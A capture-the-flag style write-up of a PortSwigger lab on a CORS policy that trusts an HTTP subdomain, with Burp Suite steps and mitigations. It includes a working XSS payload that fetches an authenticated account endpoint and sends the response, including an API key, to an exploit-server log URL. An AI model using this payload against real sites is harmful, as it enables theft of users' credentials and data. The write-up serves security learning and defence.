# CORS Misconfiguration: Trusted Insecure Protocols

 A CORS policy that trusts arbitrary subdomains and accepts `http://` origins can enable sensitive-data exfiltration (cookies, API keys) via cross-origin requests especially when combined with XSS or a network-level downgrade (MITM).

Background

- Many apps use multiple subdomains (e.g., `stock.example.com`, `api.example.com`) and want selective CORS between them.
- A common misconfiguration is reflecting `Origin` or allowing wildcard subdomains without enforcing HTTPS. When `Access-Control-Allow-Credentials: true` is present, a malicious script on an insecure origin can read authenticated responses.

Impact

- An attacker who can run JavaScript on a trusted origin (via XSS or injected content on an HTTP subdomain) can fetch and exfiltrate sensitive API responses.
- Even without XSS, accepting `http://` origins enables network-level attacks (MITM) to inject scripts and capture data.

Summary of my findings

- I found an application that accepted a trusted subdomain served over HTTP. The app made authenticated requests to an endpoint (`GET /accountDetails`) that returned sensitive user data when CORS allowed the origin with credentials.
- The `Check stock` feature on the HTTP subdomain was vulnerable to XSS. I hosted an exploit on the provided server and used it to exfiltrate account details and an API key.

Exploitation

1. I logged in as a normal user (wiener) and captured the authenticated request to `/accountDetails` in Burp Suite's history, which returned sensitive account data.
![alt text](Login.png)
![alt text](<logging creds.png>)

2. To test CORS, I forwarded the request to Repeater and added an `Origin` header with a random host. The response didn't reflect my origin, indicating no wildcard or reflection. Testing with null origin also failed. 
![alt text](<domain rejected.png>)
![alt text](<null rejected.png>)

3. However, the site whitelisted a trusted subdomain served over plain HTTP. After exploring endpoints, I found the "Check stock" feature used HTTP and was vulnerable to XSS via the productId parameter.
![alt text](<insecure  subdomain acceptance.png>)
![alt text](<vuln cors http.png>)
![alt text](<vuln cors http.png>)
![alt text](<xss conf.png>)

4. I crafted an XSS payload that fetched `/accountDetails` with credentials and exfiltrated the data. Hosting it on the exploit server and delivering it to a victim revealed username, email, and API key, solving the lab.

The payload I used:

```
<html>
    <head>
        <h2>CORS-3</h2>
    </head>
    <body>
        <script>
           document.location="http://stock.0a8d005503020682823c835e00b20034.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener; req.open('get','https://0a8d005503020682823c835e00b20034.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a560029031b065e826f825a015400fa.exploit-server.net/log?data='%2bthis.responseText; };;%3c/script>&storeId=1"
        </script>
    </body>
</html>

```
![alt text](<deliver to victim.png>)
![alt text](<access log.png>)
![alt text](image.png)
![alt text](solved.png)

What I've learn't

This lab highlighted the danger of protocol agnostic trust. Trusting *.example.com regardless of whether it uses HTTP or HTTPS is a common misconfiguration that allows for protocol downgradde attacks.

Mitigations

- Explicitly whitelist origins: do not reflect `Origin` or permit broad wildcards. Use a strict allowlist such as `Access-Control-Allow-Origin: https://stock.example.com`.

- Enforce HTTPS-only origins. Reject `http://` origins server-side.

- Avoid `Access-Control-Allow-Credentials: true` on public APIs; enable credentials only for specific trusted origins.

- Fix XSS across all subdomains; treat subdomains as first-class security boundaries.

- Validate `Origin` against a server-side whitelist rather than trusting client-supplied headers.

- Example (Node.js + cors middleware):

```js
const allowed = ['https://stock.example.com'];
app.use(cors({ origin: (origin, cb) => cb(null, allowed.includes(origin)), credentials: true }));
```

Tools used

- Burp Suite (Proxy, Repeater)
- PortSwigger exploit server (payload hosting)

References
- PortSwigger labs and documentation on CORS and XSS (https://portswigger.net/web-security/cors/lab-breaking-https-attack).

Happy (ethical) Hacking!
